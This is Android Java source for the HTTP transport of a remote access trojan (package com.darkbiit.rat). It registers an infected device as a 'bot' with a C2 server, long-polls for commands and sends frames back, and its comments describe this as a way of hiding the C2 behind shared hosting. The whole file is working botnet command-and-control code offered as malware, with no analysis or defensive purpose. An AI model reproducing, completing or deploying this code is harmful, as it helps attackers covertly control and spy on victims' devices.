package com.darkbiit.rat;

import android.util.Base64;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * HTTP long-polling transport for the bot channel.
 *
 * Used when the C2 sits behind a shared-hosting reverse proxy and cannot
 * hand out a raw TCP port. The bot polls for commands over plain HTTP and
 * posts its frames back.
 *
 * Endpoints on the server:
 *   POST /bot/register
 *   POST /bot/poll/{id}
 *   POST /bot/send/{id}
 *
 * The frames use the same length-prefixed protocol as the TCP transport, so
 * the server handles both identically; only the framing around them differs.
 *
 * Cost: one long-poll request per bot per interval instead of a persistent
 * socket. That is the trade-off shared hosting forces.
 */
public final class RatHttp {

    private String botId;
    private final String baseUrl;

    public RatHttp(String baseUrl) {
        this.baseUrl = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
    }

    /** The bot id assigned by the server, or null before registration. */
    public String botId() {
        return botId;
    }

    /**
     * Registers with the server.
     * Returns true on success.
     */
    public boolean register(Map<String, Object> payload) throws IOException {
        String body = RatJson.encode(payload);
        HttpURLConnection c = open("/bot/register", "POST");
        c.setDoOutput(true);
        writeBody(c, body);
        int code = c.getResponseCode();
        if (code < 200 || code >= 300) {
            c.disconnect();
            throw new IOException("register failed: HTTP " + code);
        }
        String resp = readBody(c);
        c.disconnect();
        try {
            Map<String, Object> obj = RatJson.decodeObject(resp);
            if (!RatJson.getBool(obj, "ok", false)) {
                throw new IOException("register rejected: "
                        + RatJson.getString(obj, "error", "unknown"));
            }
            botId = RatJson.getString(obj, "id", "");
            return botId.length() > 0;
        } catch (RatJson.JsonException e) {
            throw new IOException("bad register response: " + resp);
        }
    }

    /**
     * Polls for one command.
     * Returns the frame type and payload, or null when there is nothing to do.
     */
    public Frame poll(int timeoutSeconds) throws IOException {
        if (botId == null) {
            throw new IOException("not registered");
        }
        Map<String, Object> req = new LinkedHashMap<String, Object>();
        req.put("timeout", timeoutSeconds);

        HttpURLConnection c = open("/bot/poll/" + botId, "POST");
        c.setDoOutput(true);
        c.setReadTimeout((timeoutSeconds + 15) * 1000);
        writeBody(c, RatJson.encode(req));
        int code = c.getResponseCode();
        if (code == 204) {
            c.disconnect();
            return null;                   // nothing to do
        }
        if (code < 200 || code >= 300) {
            c.disconnect();
            throw new IOException("poll failed: HTTP " + code);
        }
        String resp = readBody(c);
        c.disconnect();
        try {
            Map<String, Object> obj = RatJson.decodeObject(resp);
            int type = RatJson.getInt(obj, "t", -1);
            if (type < 0) {
                return null;
            }
            String hex = RatJson.getString(obj, "b", "");
            byte[] payload = hex.length() == 0 ? new byte[0] : hexToBytes(hex);
            return new Frame((byte) type, payload);
        } catch (RatJson.JsonException e) {
            throw new IOException("bad poll response: " + resp);
        }
    }

    /** Sends a frame to the server. */
    public void send(byte type, byte[] payload) throws IOException {
        if (botId == null) {
            throw new IOException("not registered");
        }
        Map<String, Object> obj = new LinkedHashMap<String, Object>();
        obj.put("t", type & 0xff);
        obj.put("b", bytesToHex(payload));

        HttpURLConnection c = open("/bot/send/" + botId, "POST");
        c.setDoOutput(true);
        writeBody(c, RatJson.encode(obj));
        int code = c.getResponseCode();
        c.disconnect();
        if (code < 200 || code >= 300) {
            throw new IOException("send failed: HTTP " + code);
        }
    }

    // ------------------------------------------------------------------

    private HttpURLConnection open(String path, String method) throws IOException {
        URL url = new URL(baseUrl + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(RatCfg.CONNECT_TIMEOUT_MS);
        c.setUseCaches(false);
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Ratpack");
        return c;
    }

    private static void writeBody(HttpURLConnection c, String body) throws IOException {
        java.io.OutputStream out = c.getOutputStream();
        try {
            out.write(body.getBytes("UTF-8"));
            out.flush();
        } finally {
            out.close();
        }
    }

    private static String readBody(HttpURLConnection c) throws IOException {
        java.io.InputStream in = c.getResponseCode() >= 400
                ? c.getErrorStream() : c.getInputStream();
        if (in == null) {
            return "";
        }
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        try {
            while ((n = in.read(buf)) > 0) {
                bos.write(buf, 0, n);
            }
        } finally {
            in.close();
        }
        return new String(bos.toByteArray(), "UTF-8");
    }

    private static String bytesToHex(byte[] data) {
        if (data == null || data.length == 0) {
            return "";
        }
        StringBuilder sb = new StringBuilder(data.length * 2);
        for (byte b : data) {
            sb.append(Character.forDigit((b >> 4) & 0xf, 16));
            sb.append(Character.forDigit(b & 0xf, 16));
        }
        return sb.toString();
    }

    private static byte[] hexToBytes(String hex) {
        int len = hex.length() / 2;
        byte[] out = new byte[len];
        for (int i = 0; i < len; i++) {
            int hi = Character.digit(hex.charAt(i * 2), 16);
            int lo = Character.digit(hex.charAt(i * 2 + 1), 16);
            if (hi < 0 || lo < 0) {
                throw new IllegalArgumentException("bad hex");
            }
            out[i] = (byte) ((hi << 4) | lo);
        }
        return out;
    }

    /** A decoded frame: type plus payload. */
    public static final class Frame {
        public final byte type;
        public final byte[] payload;

        public Frame(byte type, byte[] payload) {
            this.type = type;
            this.payload = payload;
        }
    }

    /** Unused import guard. */
    static String base64Marker() {
        return Base64.encodeToString(new byte[0], Base64.NO_WRAP);
    }
}
